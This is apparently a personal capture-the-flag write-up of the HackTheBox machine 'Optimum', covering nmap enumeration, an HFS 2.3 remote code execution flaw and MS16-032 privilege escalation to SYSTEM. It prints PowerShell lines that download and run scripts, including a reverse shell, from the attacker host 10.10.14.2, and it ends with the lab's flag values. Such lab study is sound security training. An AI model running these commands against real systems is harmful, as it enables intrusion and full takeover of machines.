---
tags: #linux
---
# Optimum 
#web #hfs #technique-webserver #searchsploit #cve-exploit 

**IP**: 10.10.10.8
**Start date**: [[2022-04-14]]
**End date**: [[2022-04-15]]

### 1.0 Enumeration - Nmap
Initial enumeration. 

```ad-note
title: `nmap -SCV -p- -n -Pn --min-rate 5000 -oA nmap/optimum.tcp 10.10.10.8`
collapse: open
```python
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

There is only one port open, which is 80 and hosting a http web server running `HttpFileServer` version `httpd 2.3`. 

We also run an UDP scanning `nmap -sU -n -Pn --min-rate 5000 nmap/optimum.udp 10.10.10.8` but it returns nothing. 


### 1.1 Enumeration - Port 80
The first I notice is the web server is running `HttpFileServer 2.3`, so I run a `searchsploit httpd` to check if the version is vulnerable or has a public exploit out in the wild. 

There is a **remote code execution (rce)** vulnerability. 

The exploit abuses the search functionality by using a `null character`( %00). 


### 2.0 Exploitation -> kostas

Exploiting the vulnerability is quite easy and can be done by varios ways, the easiest is to forge a custom GET request to execute a powershell. 

```ad-danger
title: Architecture issues

By running `systeminfo` inside the victim machine we know the system is **x64-based PC**.

It is important to notice that if we run the standard `powershell` inside our rce.py exploit it will get us a powershell 32-bit process inside a x64 OS !

This is probabily because the HFS (httpfileserver) process is likely running as a 32-bit process.

To check the CLI process architecture we can run `[Environment]::Is64BitProcess`. 

In a 64-bit Windows to get the 64-bit version of powershell we can run powershell directly from its directory `C:\Windows\sysNative\WindowsPowerShell\v1.0\powershell.exe` this will return a 64-bit powershell process.

More information about process architecture at [[Powershell Shell Version]]
```


The exploit returns a stable shell as user `kostas`. 
![[httpfileserver_vuln_rce.png]]

### 3.0 Privilege escalation: kostas --> nt authority

We run an initial check on the system by running `systeminfo` and sending it to our machine and running `windows-exploit-suggester`. 

```ad-note
title: `python2.7 windows-exploit-suggester --database db.xls --systeminfo sysinfo`

It returns a lot of possible exploits that are vulnerable, let's try one that allows us to escalate privileges.

(..)
```python
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important                      
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC

```
(..)

We can get a `.ps1` version of the exploit by running `searchsploit ms16-032`. 
```

```ad-note
title: Automatic ``.ps1` function execution.

When treating a `.ps1` function we want to run, there is a simple trick to run it without importing it as a module in powershell. This is by adding the function we previously declared at the end of the file.

In our case we declare the function `function Invoke-MS16-032 {..}`, so we add an extra line at the end of the line `Invoke-MS16-032`. 
```

```ad-bug
title: New GUI shell using searchsploit `.ps1` exploit. 

Running the previous exploit tells us an new shell has been opened but nothing spawns. This is probably (confirmed) that a new shell is literally being spawned, ie another GUI process. If we run it multiple times we will see that multiple `cmd` processs have been initialized. 

Empire did a re-edit of the exploit to allow command execution. 
The exploit can be found here [Invoke-MS16-032](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)

Next step is now to use the switch `-command` to send a reverse shell inside the administrator shell.
```

```ad-success
title: `IEX(New-Object Net.WebClient).downloadString("http://10.10.14.2:8000/Invoke-MS16-032.ps1")`

First of all, we modify the last line we added to the`.ps1` to invoke us a reverse shell.  

In this case we will host a python web server with a rev.ps1 (from nishang) which will be listening on port `443`

`Invoke-MS16032 -Command IEX(New-Object Net.WebClient).downloadString("http://10.10.14.2:8000/rev.ps1")`


On running we get the shell as `nt authority / system`. Voila! We are root!.

![[root.png]]

```



**Flags**
- **User**: d0c39409d7b994a9a1389ebf38ef5f73
- **Root**: 51ed1b36553c8461f4552c2e92b3eeed
